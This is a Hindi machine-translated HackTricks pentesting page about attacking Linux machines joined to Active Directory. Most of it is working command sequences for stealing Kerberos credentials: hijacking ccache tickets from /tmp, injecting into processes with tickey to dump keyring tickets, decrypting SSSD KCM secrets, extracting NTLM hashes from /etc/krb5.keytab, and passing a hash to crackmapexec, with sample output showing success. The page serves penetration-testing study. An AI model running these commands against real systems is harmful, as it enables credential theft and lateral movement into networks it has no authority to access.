# लिनक्स एक्टिव डायरेक्टरी

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ हैकट्रिक्स क्लाउड ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 ट्विटर 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ ट्विच 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 यूट्यूब 🎥</strong></a></summary>

* क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **हैकट्रिक्स में विज्ञापित करना** चाहते हैं? या क्या आपको **PEASS की नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की आवश्यकता है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष संग्रह [**NFTs**](https://opensea.io/collection/the-peass-family)
* [**आधिकारिक PEASS और HackTricks swag**](https://peass.creator-spring.com) प्राप्त करें
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में या मुझे **ट्विटर** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **हैकिंग ट्रिक्स साझा करें और PRs सबमिट करें [hacktricks रेपो](https://github.com/carlospolop/hacktricks) और [hacktricks-cloud रेपो](https://github.com/carlospolop/hacktricks-cloud) में।**

</details>

एक लिनक्स मशीन एक एक्टिव डायरेक्टरी पर्यावरण में भी मौजूद हो सकती है।

एक एडी में लिनक्स मशीन **फ़ाइलों में विभिन्न CCACHE टिकट्स संग्रहीत कर सकती है। इन टिकट्स का उपयोग और दुरुपयोग किसी भी अन्य केरबेरोस टिकट की तरह किया जा सकता है**। इन टिकट्स को पढ़ने के लिए, आपको टिकट के उपयोगकर्ता मालिक या मशीन के अंदर **रूट** होना चाहिए।

## जांच

### लिनक्स से एडी जांच

यदि आपके पास लिनक्स में AD पर पहुंच है (या Windows में बैश है), तो आप AD की जांच के लिए [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) का उपयोग कर सकते हैं।

आप लिनक्स से AD की जांच करने के **अन्य तरीकों** के बारे में जानने के लिए निम्नलिखित पृष्ठ की जांच कर सकते हैं:

{% content-ref url="../../network-services-pentesting/pentesting-ldap.md" %}
[pentesting-ldap.md](../../network-services-pentesting/pentesting-ldap.md)
{% endcontent-ref %}

### FreeIPA

यह एक खुला स्रोत **विकल्प** है Microsoft Windows **Active** **Directory**, मुख्य रूप से **Unix** पर्यावरणों के लिए एक एकीकृत प्रबंधन समाधान के रूप में उपयोग किया जाता है। इसके बारे में अधिक जानकारी के लिए देखें:

{% content-ref url="../freeipa-pentesting.md" %}
[freeipa-pentesting.md](../freeipa-pentesting.md)
{% endcontent-ref %}

## टिकट्स के साथ खेलना

### टिकट पास करें

इस पृष्ठ पर आपको विभिन्न स्थानों के बारे में पता चलेगा जहां आप **लिनक्स होस्ट में केरबेरोस टिकट्स पाएंगे**, आप निम्नलिखित पृष्ठ पर सीसीचेच टिकट्स प्रारूप को किरबी में बदलना सीख सकते हैं (जिसे आपको Windows में उपयोग करना होगा) और यहां भी एक PTT हमला कैसे करें:

{% content-ref url="../../windows-hardening/active-directory-methodology/pass-the-ticket.md" %}
[pass-the-ticket.md](../../windows-hardening/active-directory-methodology/pass-the-ticket.md)
{% endcontent-ref %}

### /tmp से CCACHE टिकट पुनःउपयोग

> जब टिकट्स को डिस्क पर फ़ाइल के रूप में संग्रहीत किया जाता है, तो मानक प्रारूप और प्रकार एक सीसीचेच फ़ाइल होता है। यह केरबेरोस क्रेडेंशियल संग्रहीत करने के लिए एक सरल बाइनरी फ़ाइल प्रारूप है। ये फ़ाइलें सामान्यतः /tmp में संग्रहीत की जाती हैं और 600 अनुमतियों के साथ सीमित होती हैं

`env | grep KRB5CCNAME` का उपयोग करके प्रमाणीकरण के लिए वर्तमान टिकट की सूची बनाएं। प्रारूप पोर्टेबल है और टिकट को **पुनःउपयोग करने के लिए पर्यावरण चर को सेट करके** किया जा सकता है `export KRB5CCNAME=/tmp/ticket.ccache`। केरबेरोस टिकट नाम प्रारूप `krb5cc_%{uid}` है जहां uid उपयोगकर्ता UID है।
```bash
ls /tmp/ | grep krb5cc
krb5cc_1000
krb5cc_1569901113
krb5cc_1569901115

export KRB5CCNAME=/tmp/krb5cc_1569901115
```
### कीक्रोबस टिकट को कीरिंग से पुनः उपयोग करें

प्रक्रियाओं को अपनी मेमोरी में कीक्रोबस टिकट संग्रहीत कर सकती हैं, यह उपकरण उन टिकटों को निकालने के लिए उपयोगी हो सकता है (मशीन `/proc/sys/kernel/yama/ptrace_scope` में पीट्रेस संरक्षण को अक्षम करना चाहिए): [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey)
```bash
# Configuration and build
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release

[root@Lab-LSV01 /]# /tmp/tickey -i
[*] krb5 ccache_name = KEYRING:session:sess_%{uid}
[+] root detected, so... DUMP ALL THE TICKETS!!
[*] Trying to inject in tarlogic[1000] session...
[+] Successful injection at process 25723 of tarlogic[1000],look for tickets in /tmp/__krb_1000.ccache
[*] Trying to inject in velociraptor[1120601115] session...
[+] Successful injection at process 25794 of velociraptor[1120601115],look for tickets in /tmp/__krb_1120601115.ccache
[*] Trying to inject in trex[1120601113] session...
[+] Successful injection at process 25820 of trex[1120601113],look for tickets in /tmp/__krb_1120601113.ccache
[X] [uid:0] Error retrieving tickets
```
### SSSD KCM से CCACHE टिकट पुनः प्रयोग

SSSD `/var/lib/sss/secrets/secrets.ldb` पथ पर डेटाबेस की एक प्रतिलिपि बनाए रखता है। संबंधित कुंजी `/var/lib/sss/secrets/.secrets.mkey` पथ पर एक छिपी हुई फ़ाइल के रूप में संग्रहीत की जाती है। डिफ़ॉल्ट रूप से, यह कुंजी केवल तभी पढ़ी जा सकती है जब आपके पास **रूट** अनुमतियाँ हों।

`SSSDKCMExtractor` को --database और --key पैरामीटर के साथ आह्वान करने से डेटाबेस को विश्लेषित किया जाएगा और सीक्रेट्स को **डिक्रिप्ट** किया जाएगा।
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
**क्रेडेंशियल कैश केरबेरोस ब्लॉब** को एक उपयोगी केरबेरोस सीकैश फ़ाइल में बदला जा सकता है जिसे Mimikatz/Rubeus को पास किया जा सकता है।

### कीटैब से सीकैश टिकट पुनःउपयोग करें
```bash
git clone https://github.com/its-a-feature/KeytabParser
python KeytabParser.py /etc/krb5.keytab
klist -k /etc/krb5.keytab
```
### /etc/krb5.keytab से खाते निकालें

रूट के रूप में चलने वाली सेवाओं द्वारा उपयोग की जाने वाली सेवा कुंजी आमतौर पर **`/etc/krb5.keytab`** फ़ाइल में संग्रहीत की जाती है। यह सेवा कुंजी सेवा के पासवर्ड के समकक्ष होती है, और इसे सुरक्षित रखा जाना चाहिए।

[`klist`](https://adoptopenjdk.net/?variant=openjdk13\&jvmVariant=hotspot) का उपयोग करके कीटैब फ़ाइल को पढ़ें और इसकी सामग्री को पार्स करें। जब [कुंजी प्रकार](https://cwiki.apache.org/confluence/display/DIRxPMGT/Kerberos+EncryptionKey) 23 हो, तो आप वास्तविक **उपयोगकर्ता का एनटी हैश** देखेंगे।
```
klist.exe -t -K -e -k FILE:C:\Users\User\downloads\krb5.keytab
[...]
[26] Service principal: host/COMPUTER@DOMAIN
KVNO: 25
Key type: 23
Key: 31d6cfe0d16ae931b73c59d7e0c089c0
Time stamp: Oct 07,  2019 09:12:02
[...]
```
लिनक्स पर आप [`KeyTabExtract`](https://github.com/sosdave/KeyTabExtract) का उपयोग कर सकते हैं: हमें RC4 HMAC हैश का उपयोग करके NLTM हैश को पुनः उपयोग करना है।
```bash
python3 keytabextract.py krb5.keytab
[!] No RC4-HMAC located. Unable to extract NTLM hashes. # No luck
[+] Keytab File successfully imported.
REALM : DOMAIN
SERVICE PRINCIPAL : host/computer.domain
NTLM HASH : 31d6cfe0d16ae931b73c59d7e0c089c0 # Lucky
```
**macOS** पर आप [**`bifrost`**](https://github.com/its-a-feature/bifrost) का उपयोग कर सकते हैं।
```bash
./bifrost -action dump -source keytab -path test
```
CME का उपयोग करके खाता और हैश का उपयोग करके मशीन से कनेक्ट करें।
```bash
$ crackmapexec 10.XXX.XXX.XXX -u 'COMPUTER$' -H "31d6cfe0d16ae931b73c59d7e0c089c0" -d "DOMAIN"
CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 31d6cfe0d16ae931b73c59d7e0c089c0
```
## संदर्भ

* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **हैकट्रिक्स में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करना चाहिए? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष [**NFT**](https://opensea.io/collection/the-peass-family) संग्रह!
* प्राप्त करें [**आधिकारिक PEASS और HackTricks swag**](https://peass.creator-spring.com)
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **ट्विटर** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **अपने हैकिंग ट्रिक्स साझा करें, [hacktricks रेपो](https://github.com/carlospolop/hacktricks) और [hacktricks-cloud रेपो](https://github.com/carlospolop/hacktricks-cloud) में पीआर जमा करके।**

</details>
